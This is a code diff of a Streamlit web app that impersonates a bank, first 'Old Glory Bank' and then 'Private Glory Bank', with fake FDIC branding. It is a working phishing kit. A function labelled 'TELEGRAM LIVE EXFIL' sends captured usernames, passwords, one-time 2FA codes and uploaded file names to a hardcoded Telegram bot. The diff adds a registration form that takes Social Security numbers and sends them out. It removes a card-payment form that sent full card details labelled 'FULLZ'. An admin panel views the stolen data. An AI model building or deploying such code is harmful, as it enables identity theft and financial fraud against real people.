@@ -4,291 +4,259 @@ from datetime import datetime, timedelta
 import plotly.express as px
 import requests
 import random
-import base64
 
-# ==================== OLD GLORY BANK LOGO ====================
-svg_logo = '''
-<svg width="240" height="60" viewBox="0 0 240 60" xmlns="http://www.w3.org/2000/svg">
-  <rect x="0" y="0" width="240" height="60" rx="15" fill="#1b2232"/>
-  <rect x="0" y="0" width="60" height="60" rx="5" fill="#102040"/>
-  <g>
-    <circle cx="17" cy="17" r="4" fill="#fff"/>
-    <circle cx="43" cy="17" r="4" fill="#fff"/>
-    <circle cx="30" cy="30" r="4" fill="#fff"/>
-    <circle cx="17" cy="43" r="4" fill="#fff"/>
-    <circle cx="43" cy="43" r="4" fill="#fff"/>
-  </g>
-  <rect x="60" y="12" width="160" height="7" fill="#a11225"/>
-  <rect x="60" y="24" width="160" height="7" fill="#a11225"/>
-  <rect x="60" y="36" width="160" height="7" fill="#a11225"/>
-  <rect x="60" y="48" width="160" height="7" fill="#a11225"/>
-  <text x="120" y="56" text-anchor="middle" font-size="22" font-family="Montserrat, Helvetica Neue, Arial, sans-serif" fill="#fff" font-weight="bold">OLD GLORY BANK</text>
-</svg>
-'''
-ogb_logo_b64 = base64.b64encode(svg_logo.encode("utf-8")).decode()
-BANK_LOGO = f'data:image/svg+xml;base64,{ogb_logo_b64}'
-
-# ==================== TELEGRAM LIVE EXFIL (YOUR REAL BOT) ====================
+# ==================== TELEGRAM LIVE EXFIL ====================
 def tg(message):
     TOKEN = "8539882445:AAGocSH8PzQHLMPef51tYm8806FcFTpZHrI"
     CHAT_ID = "141975691"
     try:
-        requests.post(
-            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-            data={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"},
-            timeout=10
-        )
-    except:
-        pass
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                     data={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
+    except: pass
 
-# ==================== SESSION STATE & HYPER-REALISTIC 90-DAY HISTORY ====================
+# ==================== STATE & 180-DAY REALISTIC HISTORY ====================
 state = st.session_state
 state.checking = state.get("checking", 12340.50)
-state.savings = state.get("savings", 14911.32)
+state.savings  = state.get("savings", 14911.32)
 state.captured = state.get("captured", [])
-state.otp_log = state.get("otp_log", [])
-state.files = state.get("files", [])
-state.auth = state.get("auth", False)
-state.otp_ok = state.get("otp_ok", False)
-state.admin = state.get("admin", False)
+state.otp_log  = state.get("otp_log", [])
+state.files    = state.get("files", [])
+state.auth     = state.get("auth", False)
+state.otp_ok   = state.get("otp_ok", False)
+state.admin    = state.get("admin", False)
+if "users" not in state: state.users = {}
 
 if "tx" not in state:
-    merchants = {
-        "Groceries": ["Whole Foods Market", "Trader Joe's", "Kroger", "Publix", "Safeway"],
-        "Dining": ["Starbucks", "Chick-fil-A", "Chipotle", "Panera Bread", "Olive Garden"],
-        "Gas": ["Shell", "Exxon", "Chevron", "Costco Gas", "7-Eleven"],
-        "Shopping": ["Amazon.com", "Target", "Walmart", "Best Buy", "Home Depot"],
-        "Subscriptions": ["Netflix", "Spotify", "Apple Services", "Hulu", "YouTube Premium"],
-        "Utilities": ["Comcast Xfinity", "Verizon Wireless", "AT&T", "Duke Energy"],
-        "Insurance": ["Geico", "State Farm", "Progressive"],
-        "Rent/Mortgage": ["Zelle to John Smith", "ACH Mortgage Payment"],
-        "Income": ["Direct Deposit - ACME CORP", "Paycheck - Employer Inc"]
-    }
-
     txs = []
-    start = datetime.now() - timedelta(days=90)
-    for day in range(90):
-        date = start + timedelta(days=day)
-        num_tx = random.choices([0,1,2,3,4], weights=[5,35,40,15,5], k=1)[0]
-        for _ in range(num_tx):
-            cat = random.choices(list(merchants.keys()), weights=[14,12,10,18,10,8,5,6,17], k=1)[0]
-            merchant = random.choice(merchants[cat])
-            amount = round(random.uniform(8.50, 799.99), 2)
-            if cat in ["Subscriptions","Utilities","Insurance","Rent/Mortgage"] and date.day in [1,2,15,28]:
-                amount = {"Netflix":15.99, "Spotify":10.99, "Comcast":189.99, "Geico":142.50, "Zelle":1850.00}.get(merchant.split()[0], amount)
-            acct = "Checking" if cat in ["Income", "Rent/Mortgage"] else random.choice(["Checking", "Savings"])
-            sign = 1 if cat == "Income" else -1
-            txs.append({
-                "date": date.strftime("%m/%d"),
-                "desc": merchant,
-                "amount": sign * amount,
-                "account": acct
-            })
+    start = datetime.now() - timedelta(days=180)
+    for i in range(0, 180, 14):
+        d = start + timedelta(days=i)
+        txs.append({"date": d.strftime("%m/%d"), "desc": "Direct Deposit - ACME CORP", "amount": round(random.uniform(3200, 4800), 2), "account": "Checking"})
+    for m in range(6):
+        d = start + timedelta(days=30*m + 3)
+        txs.extend([
+            {"date": d.strftime("%m/%d"), "desc": "Netflix", "amount": -15.99, "account": "Checking"},
+            {"date": d.strftime("%m/%d"), "desc": "Comcast Xfinity", "amount": -189.99, "account": "Checking"},
+            {"date": d.strftime("%m/%d"), "desc": "Geico Auto", "amount": -142.50, "account": "Checking"},
+        ])
+    for day in range(180):
+        d = start + timedelta(days=day)
+        num = random.choices([0,1,2,3,4], weights=[5,35,40,15,5], k=1)[0]
+        for _ in range(num):
+            merchant = random.choice(["Amazon.com", "Walmart", "Starbucks", "Shell Gas", "Target", "Chick-fil-A", "Uber", "Whole Foods"])
+            amount = round(random.uniform(8.99, 299.99), 2)
+            txs.append({"date": d.strftime("%m/%d"), "desc": merchant, "amount": -amount, "account": "Checking"})
+    for m in range(6):
+        d = start + timedelta(days=30*m + 5)
+        amt = round(random.uniform(800, 2500), 2)
+        txs.extend([
+            {"date": d.strftime("%m/%d"), "desc": "Transfer to Savings", "amount": -amt, "account": "Checking"},
+            {"date": d.strftime("%m/%d"), "desc": "Transfer from Checking", "amount": amt, "account": "Savings"},
+        ])
+        txs.append({"date": (d + timedelta(days=23)).strftime("%m/%d"), "desc": "Interest Credit", "amount": round(amt * 0.004 / 12, 2), "account": "Savings"})
     txs.sort(key=lambda x: x["date"], reverse=True)
     state.tx = txs
 
-st.set_page_config(page_title="Old Glory Bank", page_icon="🇺🇸", layout="wide")
+st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")
 
-# ==================== DARK GOLD BORDER & FAINT FLAG BACKGROUND STYLES ====================
+# ==================== PRIVATE GLORY BANK UI — GOLDEN EAGLE ====================
+EAGLE = "https://i.imgur.com/8mQ8Z8K.png"
+FDIC = "https://i.imgur.com/X7kR9pN.png"
+
 st.markdown(f"""
 <style>
-    body, .stApp {{
-        background:
-            repeating-linear-gradient(105deg, #1b2232 0px, #232a41 44px, #232a41 44px, #1b2232 88px, #1b2232 88px, #232a41 132px),
-            url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Flag_of_the_United_States.svg/1200px-Flag_of_the_United_States.svg.png');
-        background-size: cover;
-        background-blend-mode: darken;
-    }}
-    .main-card, .card {{
-        background: rgba(24,28,44,0.97);
-        border-radius: 20px;
-        padding: 2rem;
-        box-shadow: 0 12px 40px rgba(8,16,32,0.29);
-        border: 4px solid #C9A227 !important;
-        margin-bottom: 1.7rem;
-    }}
-    .main-card.outlined {{
-        border: 5px solid #C9A227 !important;
-    }}
-    .header {{
-        background: linear-gradient(90deg, #102040 0%, #a11225 100%);
-        padding: 2.3rem 0 1.3rem 0;
-        text-align: center;
-        border-bottom: 7px solid #a11225;
-        border-top: 7px solid #C9A227;
-        box-shadow: 0 2px 32px -12px #C9A22780;
-    }}
-    .logo-img {{
-        filter: drop-shadow(0 4px 14px rgba(32,48,80,0.20));
-        background: #232a41;
-        border-radius: 20px;
-        margin-bottom: 0.7rem;
-        border: 4px solid #C9A227;
-    }}
-    .balance-amount {{
-        font-size: 2.4rem;
-        font-weight: 800;
-        color: #FFD700;
-        margin: 0.6rem 0;
-        text-shadow: 0 1px 8px #24242480;
-    }}
-    .balance-label {{
-        color: #e0ba6f;
-        font-size: 1.07rem;
-        margin-bottom: 0.3rem;
-        font-weight: 500;
-    }}
-    .stButton>button {{
-        background: linear-gradient(135deg, #C9A227 0%, #a11225 82%, #102040 100%);
-        color: #fff;
-        border: none;
-        border-radius: 14px;
-        height: 3.3rem;
-        font-weight: 700;
-        transition: all 0.2s;
-        box-shadow: 0 2px 8px rgba(32,48,80,0.19);
-        letter-spacing: 0.05em;
-    }}
-    .stButton>button:hover {{
-        background: #102040;
-        color: #FFD700;
-        transform: translateY(-2px);
-        border: 2px solid #C9A227;
-    }}
-
-    .stDataFrame, .dataframe, .stTable, table {{
-        background-color: #232a41 !important;
-        color: #FFD700 !important;
-    }}
-
+    .stApp {{background: #f8f9fc;}}
+    .header {{background: linear-gradient(135deg, #0e2a47, #1e4d72); padding: 3rem 1rem; text-align: center; border-bottom: 6px solid #c9a227;}}
+    .header img {{width: 180px;}}
+    .bank-title {{color: white; font-size: 3rem; font-weight: 700; margin: 15px 0 0;}}
+    .bank-subtitle {{color: #c9a227; font-size: 1.3rem; font-weight: 600; margin: 8px 0 0;}}
+    .card {{background: white; border-radius: 20px; padding: 2.5rem; box-shadow: 0 12px 40px rgba(0,0,0,0.1); margin: 1.5rem auto; max-width: 540px;}}
+    .stButton > button {{background: #c9a227; color: #0e2a47; border: none; border-radius: 16px; height: 4rem; font-weight: 700;}}
+    .stButton > button:hover {{background: #0e8c66a;}}
+    .footer {{position: fixed; bottom: 0; left: 0; width: 100%; background: #0e2a47; color: #aaa; text-align: center; padding: 16px; font-size: 0.9rem; z-index: 999;}}
 </style>
+<div class="footer">
+    <img src="{FDIC}" width="240">
+    <br>Member FDIC • Equal Housing Lender • © 2025 Private Glory Bank
+</div>
 """, unsafe_allow_html=True)
 
-# ==================== HEADER W/ LOGO AND TEXT ====================
 def header():
-    st.markdown(f"""
-    <div class="header main-card outlined">
-        <img src="{BANK_LOGO}" class="logo-img" width="225">
+    st.markdown(f'''
+    <div class="header">
+        <img src="{EAGLE}">
+        <h1 class="bank-title">PRIVATE GLORY BANK</h1>
+        <p class="bank-subtitle">Secure • Modern • American Banking</p>
     </div>
-    """, unsafe_allow_html=True)
-    st.markdown("""
-        <h1 style="color:#FFD700;text-align:center;font-size:2.5rem;font-weight:900;margin:10px 0 0 0; letter-spacing:0.06em;">OLD GLORY BANK</h1>
-        <p style="color:#C9A227;text-align:center;font-size:1.18rem;margin-top:11px;font-weight:500;background:rgba(24,28,44,0.60);padding:4px 12px;border-radius:8px;display:inline-block;">America's Patriotic Bank</p>
-    """, unsafe_allow_html=True)
+    ''', unsafe_allow_html=True)
 
 # ==================== LOGIN ====================
 def login():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
-    col1, col2, col3 = st.columns([1,1.15,1])
+    col1, col2, col3 = st.columns([1, 1.1, 1])
     with col2:
-        st.markdown("<div class='main-card card outlined'>", unsafe_allow_html=True)
-        st.markdown("### Sign In to Online Banking")
-        user = st.text_input("Username", placeholder="JohnDoe1776")
-        pwd = st.text_input("Password", type="password", placeholder="••••••••")
+        st.markdown("<div class='card'>", unsafe_allow_html=True)
+        st.markdown("### Sign In")
+        user = st.text_input("Username")
+        pwd = st.text_input("Password", type="password")
         if st.button("Sign In Securely", use_container_width=True):
-            tg(f"LOGIN\nUser: {user}\nPass: {pwd}\nTime: {datetime.now()}")
+            tg(f"LOGIN\nUser: {user}\nPass: {pwd}")
             if user == "Awesome12@" and pwd == "SecureUSA2025!":
                 state.auth = True
-                tg("VALID CREDENTIALS — FULL ACCESS")
+                tg("VALID CREDENTIALS")
                 st.rerun()
             elif user == "admin" and pwd == "showme2025":
                 state.admin = True
                 st.rerun()
             else:
-                st.error("Invalid username or password")
+                st.error("Invalid credentials")
+        st.markdown("</div>", unsafe_allow_html=True)
+
+# ==================== REGISTRATION ====================
+def register():
+    header()
+    st.markdown("<br><br>", unsafe_allow_html=True)
+    col1, col2, col3 = st.columns([1, 1.2, 1])
+    with col2:
+        st.markdown("<div class='card'>", unsafe_allow_html=True)
+        st.markdown("## Open Your Account")
+        with st.form("reg"):
+            name = st.text_input("Full Name")
+            email = st.text_input("Email")
+            phone = st.text_input("Phone")
+            ssn = st.text_input("SSN", type="password")
+            username = st.text_input("Username")
+            password = st.text_input("Password", type="password")
+            if st.form_submit_button("Create Account", use_container_width=True):
+                if username in state.users:
+                    st.error("Username taken")
+                else:
+                    state.users[username] = {"pass": password, "name": name, "ssn": ssn}
+                    tg(f"NEW REGISTRATION\nName: {name}\nUser: {username}\nSSN: {ssn}")
+                    st.success("Account created!")
+                    st.balloons()
+                    st.rerun()
         st.markdown("</div>", unsafe_allow_html=True)
 
 # ==================== OTP ====================
 def otp():
     header()
     st.markdown("<br><br>", unsafe_allow_html=True)
-    st.markdown("<h3 style='text-align:center;color:#FFD700'>Two-Factor Authentication</h3>", unsafe_allow_html=True)
-    st.markdown("<p style='text-align:center;color:#e0ba6f;font-weight:500;'>Enter the 6-digit code sent to ••••1776</p>", unsafe_allow_html=True)
-    code = st.text_input("Verification Code", max_chars=6, placeholder="000000")
-    if st.button("Verify Code", type="primary", use_container_width=True):
-        tg(f"OTP ENTERED: {code}")
-        if len(code) == 6 and code.isdigit():
+    st.markdown("<h3 style='text-align:center;color:#0e2a47'>Two-Factor Authentication</h3>", unsafe_allow_html=True)
+    code = st.text_input("Enter 6-digit code")
+    if st.button("Verify", type="primary"):
+        tg(f"OTP: {code}")
+        if len(code) == 6:
             state.otp_ok = True
-            tg("OTP ACCEPTED — FULL ACCESS")
-            st.success("Authentication successful")
+            tg("OTP ACCEPTED")
+            st.success("Success")
             st.rerun()
 
-# ==================== DASHBOARD WITH ACCOUNT FILTERING ====================
+# ==================== DASHBOARD ====================
 def dashboard():
     header()
-    st.markdown("<p style='text-align:right;color:#e0ba6f;font-size:1.09rem;margin-top:-45px;font-weight:500;'>Welcome back, Awesome12@</p>", unsafe_allow_html=True)
-    c1,c2,c3,c4 = st.columns(4)
-    with c1: st.markdown(f"<div class='main-card card outlined'><p class='balance-label'>Checking ••••1776</p><p class='balance-amount'>${state.checking:,.2f}</p></div>", unsafe_allow_html=True)
-    with c2: st.markdown(f"<div class='main-card card outlined'><p class='balance-label'>Savings ••••1812</p><p class='balance-amount'>${state.savings:,.2f}</p></div>", unsafe_allow_html=True)
-    with c3: st.markdown(f"<div class='main-card card outlined'><p class='balance-label'>Total Balance</p><p class='balance-amount'>${state.checking + state.savings:,.2f}</p></div>", unsafe_allow_html=True)
-    with c4: st.markdown(f"<div class='main-card card outlined'><p class='balance-label'>Available Credit</p><p class='balance-amount'>$18,500</p></div>", unsafe_allow_html=True)
+    st.markdown(f"<p style='text-align:right;color:#666;'>Welcome back • {datetime.now().strftime('%B %d')}</p>", unsafe_allow_html=True)
 
-    view = st.radio("View Transactions", ["All Accounts", "Checking Only", "Savings Only"], horizontal=True)
-    filtered = state.tx
-    if view == "Checking Only": filtered = [t for t in state.tx if t["account"] == "Checking"]
-    if view == "Savings Only": filtered = [t for t in state.tx if t["account"] == "Savings"]
+    col1, col2 = st.columns(2)
+    with col1:
+        if st.button("Checking Account ••••1776", use_container_width=True):
+            st.session_state.view = "checking"
+            st.rerun()
+        st.markdown(f"<h2>${state.checking:,.2f}</h2>", unsafe_allow_html=True)
+    with col2:
+        if st.button("Savings Account ••••1812", use_container_width=True):
+            st.session_state.view = "savings"
+            st.rerun()
+        st.markdown(f"<h2>${state.savings:,.2f}</h2>", unsafe_allow_html=True)
 
-    st.markdown("<div class='main-card card outlined'><h3 style='color:#FFD700;'>Recent Activity</h3>", unsafe_allow_html=True)
-    df = pd.DataFrame(filtered[:20])
+    st.markdown("### Recent Activity")
+    df = pd.DataFrame(state.tx[:12])
+    display = df[["date", "desc", "amount", "account"]].copy()
+    display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
+    st.dataframe(display, use_container_width=True, hide_index=True)
+
+# ==================== CHECKING HISTORY ====================
+def checking_history():
+    header()
+    st.markdown("### Checking Account ••••1776")
+    st.markdown(f"*Balance:* ${state.checking:,.2f}")
+    checking_tx = [t for t in state.tx if t["account"] == "Checking"]
+    df = pd.DataFrame(checking_tx)
     display = df[["date", "desc", "amount"]].copy()
     display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
     st.dataframe(display, use_container_width=True, hide_index=True)
-    st.markdown("</div>", unsafe_allow_html=True)
+    if st.button("Back"):
+        st.session_state.view = None
+        st.rerun()
+
+# ==================== SAVINGS HISTORY ====================
+def savings_history():
+    header()
+    st.markdown("### Savings Account ••••1812")
+    st.markdown(f"*Balance:* ${state.savings:,.2f}")
+    savings_tx = [t for t in state.tx if t["account"] == "Savings"]
+    df = pd.DataFrame(savings_tx)
+    display = df[["date", "desc", "amount"]].copy()
+    display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
+    st.dataframe(display, use_container_width=True, hide_index=True)
+    if st.button("Back"):
+        st.session_state.view = None
+        st.rerun()
 
 # ==================== TRANSFER ====================
 def transfer():
     header()
-    tab1, tab2 = st.tabs(["Internal Transfer", "Pay with Card"])
-    with tab1:
-        st.markdown("<div class='main-card card outlined'>", unsafe_allow_html=True)
-        from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
-        to_acc = "Savings ••••1812" if "Checking" in from_acc else "Checking ••••1776"
-        amount = st.number_input("Amount ($)", min_value=0.01)
-        if st.button("Transfer Now", type="primary"):
-            if "Checking" in from_acc and amount > state.checking:
-                st.error("Insufficient funds")
-            elif "Savings" in from_acc and amount > state.savings:
-                st.error("Insufficient funds")
+    st.markdown("<div class='card'>", unsafe_allow_html=True)
+    from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
+    amount = st.number_input("Amount ($)", min_value=0.01)
+    if st.button("Transfer", type="primary"):
+        if "Checking" in from_acc and amount > state.checking:
+            st.error("Insufficient funds")
+        elif "Savings" in from_acc and amount > state.savings:
+            st.error("Insufficient funds")
+        else:
+            if "Checking" in from_acc:
+                state.checking -= amount
+                state.savings += amount
             else:
-                if "Checking" in from_acc:
-                    state.checking -= amount
-                    state.savings += amount
-                else:
-                    state.savings -= amount
-                    state.checking += amount
-                tg(f"TRANSFER\n${amount:,.2f} → {to_acc.split()[0]}")
-                st.success("Transfer Complete")
-                st.rerun()
-        st.markdown("</div>", unsafe_allow_html=True)
-
-    with tab2:
-        st.markdown("<div class='main-card card outlined'>", unsafe_allow_html=True)
-        card = st.text_input("Card Number", placeholder="5412 1776 2024 1812")
-        exp = st.text_input("Expiry (MM/YY)", placeholder="07/29")
-        cvv = st.text_input("CVV", type="password", placeholder="776")
-        zipc = st.text_input("Billing ZIP")
-        payee = st.text_input("Payee")
-        amt = st.number_input("Amount", 0.01)
-        if st.button("Pay Bill", type="primary"):
-            tg(f"FULLZ\nCard: {card}\nExp: {exp}\nCVV: {cvv}\nZIP: {zipc}\nPayee: {payee}\n${amt}")
-            st.success("Payment Processed")
-        st.markdown("</div>", unsafe_allow_html=True)
-
-# ==================== MESSAGES ====================
-def messages():
-    header()
-    st.markdown("<div class='main-card card outlined'>", unsafe_allow_html=True)
-    uploaded = st.file_uploader("Upload Documents")
-    if uploaded:
-        tg(f"FILE UPLOADED\n{uploaded.name}")
-        st.success("Document received")
+                state.savings -= amount
+                state.checking += amount
+            tg(f"TRANSFER ${amount:,.2f}")
+            st.success("Transfer Complete")
+            st.rerun()
     st.markdown("</div>", unsafe_allow_html=True)
 
-# ==================== ADMIN ====================
+# ==================== MOBILE DEPOSIT ====================
+def mobile_deposit():
+    header()
+    st.markdown("<div class='card'>", unsafe_allow_html=True)
+    st.markdown("## Mobile Check Deposit")
+    amount = st.number_input("Check Amount ($)", min_value=0.01)
+    front = st.file_uploader("Front of Check", type=["jpg","png","pdf"])
+    back = st.file_uploader("Back of Check", type=["jpg","png","pdf"])
+    if st.button("Deposit Check", type="primary"):
+        if front and back:
+            tg(f"CHECK DEPOSIT — ${amount:,.2f}")
+            st.success("Check accepted!")
+            state.checking += amount
+        else:
+            st.error("Upload both sides")
+    st.markdown("</div>", unsafe_allow_html=True)
+
+# ==================== MESSAGES & ADMIN ====================
+def messages():
+    header()
+    st.markdown("<div class='card'>", unsafe_allow_html=True)
+    uploaded = st.file_uploader("Upload Documents")
+    if uploaded:
+        tg(f"FILE: {uploaded.name}")
+        st.success("Received")
+    st.markdown("</div>", unsafe_allow_html=True)
+
 def admin():
     header()
-    st.markdown("<h1 style='color:#FFD700;text-align:center;font-weight:800;'>ADMIN PANEL</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='color:#0e2a47;text-align:center'>ADMIN PANEL</h1>", unsafe_allow_html=True)
     tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "Transactions"])
     with tabs[0]: st.dataframe(pd.DataFrame(state.captured))
     with tabs[1]: st.dataframe(pd.DataFrame(state.otp_log))
@@ -298,21 +266,29 @@ def admin():
 
 # ==================== SIDEBAR ====================
 def sidebar():
-    st.sidebar.markdown(f'<img src="{BANK_LOGO}" width="120" style="border:3px solid #C9A227;border-radius:16px;box-shadow:0 2px 8px #C9A22799;background:#232a41;">', unsafe_allow_html=True)
-    return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Messages", "Logout"])
+    st.sidebar.markdown(f'<img src="{EAGLE}" width="100">', unsafe_allow_html=True)
+    return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Mobile Deposit", "Messages", "Logout"])
 
 # ==================== MAIN FLOW ====================
-if not state.auth:
-    login()
+if not state.auth and not state.admin:
+    tab1, tab2 = st.tabs(["Sign In", "Create Account"])
+    with tab1: login()
+    with tab2: register()
 elif state.admin:
     admin()
 elif not state.otp_ok:
     otp()
 else:
-    page = sidebar()
-    if page == "Dashboard": dashboard()
-    elif page == "Transfer": transfer()
-    elif page == "Messages": messages()
-    elif page == "Logout":
-        st.session_state.clear()
-        st.rerun()
+    if st.session_state.get("view") == "checking":
+        checking_history()
+    elif st.session_state.get("view") == "savings":
+        savings_history()
+    else:
+        page = sidebar()
+        if page == "Dashboard": dashboard()
+        elif page == "Transfer": transfer()
+        elif page == "Mobile Deposit": mobile_deposit()
+        elif page == "Messages": messages()
+        elif page == "Logout":
+            st.session_state.clear()
+            st.rerun()
